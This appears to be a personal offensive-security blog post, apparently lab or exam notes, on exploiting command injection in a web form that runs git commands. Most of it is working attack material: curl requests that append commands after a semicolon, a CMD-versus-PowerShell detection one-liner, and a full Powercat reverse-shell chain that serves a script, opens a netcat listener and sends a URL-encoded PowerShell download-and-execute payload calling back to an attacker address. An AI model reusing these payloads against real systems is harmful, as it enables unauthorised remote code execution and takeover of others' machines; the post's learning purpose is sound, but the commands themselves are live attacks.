---
layout: post
title: CMD Injection
titledate: 08/31/23
tags: ["infosec","offsec", "exploit", "web", "shell", "powershell"]
---

some applicagions may allow you to input queries or commands - in these instances we can try to add additional commands to them to see if they are properly filtered or strictly limited to what is allowed

In this example the web page allows you to enter a test command from the system command line for git, so we can grab the query in burp and then alter it to include our cmd

    $ curl -X POST --data 'cmd=git%3Bipconfig' http://192.168.50.50:8000/cmd

If we are targetting windows we can run a check to determine if the cmd executes in cmd or powershell

    $ (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

we may need to url encode the above command

<h4>Powercat</h4>

We can use Powercat to create a reverse shell

    $ /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1

first we serve the script with python
    
    $ python3 -m http.server 80

next we start our netcat listener

    $ nc -nlvp 443

finally we'll use curl to send a url encoded powershell reverse shell cmd to the target with our ip

```powershell
EX (New-Object System.Net.Webclient).DownloadString("http://192.168.1.1/powercat.ps1");powercat -c 192.168.1.1 -p 443 -e powershell
```
   
    $ curl -X POST --data 'cmd=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.1.1%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.1.1%20-p%20443%20-e%20powershell' http://192.168.50.50:8000/cmd

<h4>Linux Shell</h4>

using linux our attack might look like the following, where we use the bash one liner to create a tcp shell to our machine on 443

![_config.yml]({{ site.baseurl }}/images/web/bash_cmd_injection.png)